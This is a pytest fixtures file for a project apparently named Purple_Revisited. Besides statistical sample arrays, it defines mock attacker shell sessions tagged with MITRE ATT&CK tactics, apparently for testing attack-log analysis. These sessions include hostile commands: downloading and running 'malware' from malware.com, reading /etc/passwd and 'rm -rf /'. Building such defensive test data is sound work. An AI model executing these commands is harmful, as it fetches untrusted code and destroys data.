"""
Pytest fixtures and configuration for Purple_Revisited tests.

This file contains common test fixtures used across multiple test modules.
"""

import pytest
import numpy as np
from typing import List, Dict, Any


@pytest.fixture
def sample_data_simple():
    """Simple numerical array for basic testing."""
    return np.array([1, 2, 3, 4, 5, 6, 7, 8, 9, 10])


@pytest.fixture
def sample_data_with_outliers():
    """Numerical array with clear outliers."""
    # More realistic outlier scenario: 20 normal values + 3 extreme outliers
    return np.array([10, 12, 11, 13, 12, 11, 10, 12, 11, 13,
                     10, 11, 12, 13, 11, 10, 12, 11, 13, 12,
                     100, 105, 110])


@pytest.fixture
def sample_data_normal():
    """Normally distributed data for statistical tests."""
    np.random.seed(42)
    return np.random.normal(loc=50, scale=10, size=100)


@pytest.fixture
def sample_data_uniform():
    """Uniformly distributed data."""
    np.random.seed(42)
    return np.random.uniform(low=0, high=100, size=50)


@pytest.fixture
def sample_sessions_basic():
    """Basic session data structure."""
    return [
        {
            "length": 5,
            "full_session": [
                {"command": "ls -la", "tactic": "Discovery", "technique": "T1083"},
                {"command": "whoami", "tactic": "Discovery", "technique": "T1033"},
                {"command": "pwd", "tactic": "Discovery", "technique": "T1083"},
                {"command": "cat /etc/passwd", "tactic": "Discovery", "technique": "T1087"},
                {"command": "ps aux", "tactic": "Discovery", "technique": "T1057"}
            ]
        },
        {
            "length": 3,
            "full_session": [
                {"command": "wget malware.com", "tactic": "Command And Control", "technique": "T1071"},
                {"command": "chmod +x malware", "tactic": "Execution", "technique": "T1059"},
                {"command": "./malware", "tactic": "Execution", "technique": "T1059"}
            ]
        },
        {
            "length": 4,
            "full_session": [
                {"command": "netstat -an", "tactic": "Discovery", "technique": "T1049"},
                {"command": "ifconfig", "tactic": "Discovery", "technique": "T1016"},
                {"command": "uname -a", "tactic": "Discovery", "technique": "T1082"},
                {"command": "cat /etc/issue", "tactic": "Discovery", "technique": "T1082"}
            ]
        }
    ]


@pytest.fixture
def sample_sessions_with_zeros():
    """Session data with some zero-length sessions."""
    return [
        {"length": 5, "full_session": [{"command": "ls", "tactic": "Discovery", "technique": "T1083"}] * 5},
        {"length": 0, "full_session": []},
        {"length": 3, "full_session": [{"command": "pwd", "tactic": "Discovery", "technique": "T1083"}] * 3},
        {"length": 0, "full_session": []},
        {"length": 7, "full_session": [{"command": "whoami", "tactic": "Discovery", "technique": "T1033"}] * 7}
    ]


@pytest.fixture
def sample_sessions_varied_tactics():
    """Sessions with varied MITRE tactics for testing distribution functions."""
    return [
        {
            "length": 3,
            "full_session": [
                {"command": "ls", "tactic": "Discovery", "technique": "T1083"},
                {"command": "whoami", "tactic": "Discovery", "technique": "T1033"},
                {"command": "pwd", "tactic": "Discovery", "technique": "T1083"}
            ]
        },
        {
            "length": 4,
            "full_session": [
                {"command": "wget malware.com", "tactic": "Command And Control", "technique": "T1071"},
                {"command": "chmod +x malware", "tactic": "Execution", "technique": "T1059"},
                {"command": "./malware", "tactic": "Execution", "technique": "T1059"},
                {"command": "ls", "tactic": "Discovery", "technique": "T1083"}
            ]
        },
        {
            "length": 2,
            "full_session": [
                {"command": "rm -rf /", "tactic": "Impact", "technique": "T1485"},
                {"command": "ls", "tactic": "Discovery", "technique": "T1083"}
            ]
        }
    ]


@pytest.fixture
def empty_sessions():
    """Empty sessions list."""
    return []


@pytest.fixture
def single_session():
    """Single session for edge case testing."""
    return [
        {
            "length": 2,
            "full_session": [
                {"command": "ls", "tactic": "Discovery", "technique": "T1083"},
                {"command": "pwd", "tactic": "Discovery", "technique": "T1083"}
            ]
        }
    ]


@pytest.fixture
def sample_confidence_data():
    """Data for confidence interval testing with known properties."""
    # Data with mean=20, std≈3.16
    return np.array([15, 17, 18, 19, 20, 21, 22, 23, 25])


@pytest.fixture
def identical_data():
    """Data with no variance (all identical values)."""
    return np.array([5.0, 5.0, 5.0, 5.0, 5.0])


@pytest.fixture
def two_groups_data():
    """Two distinct groups for comparison tests."""
    np.random.seed(42)
    group1 = np.random.normal(loc=50, scale=5, size=30)
    group2 = np.random.normal(loc=70, scale=8, size=30)
    return group1, group2
